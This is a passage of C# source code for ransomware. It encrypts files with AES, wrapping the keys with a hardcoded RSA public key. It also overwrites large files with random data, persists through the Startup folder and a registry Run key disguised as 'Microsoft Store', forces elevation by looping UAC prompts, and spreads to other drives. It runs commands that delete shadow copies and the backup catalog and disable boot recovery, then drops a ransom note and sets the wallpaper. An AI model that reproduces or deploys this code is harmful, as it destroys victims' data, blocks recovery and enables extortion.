		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>mip1XfOlTPFXOoFJ4jWcdOaucozJMisnmLjHZ5eGmZGFXOe+wv88o5Gy4b3mnRYIOscbBg67iikG3tLsv+V7Yy32Pf36E787iNJDero/cJ2tnSFAoP8MknlM1kPvekoauvqLBvd0qTFAueaAQIWWOJD1xtFBvNMek3u3Vs000q0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
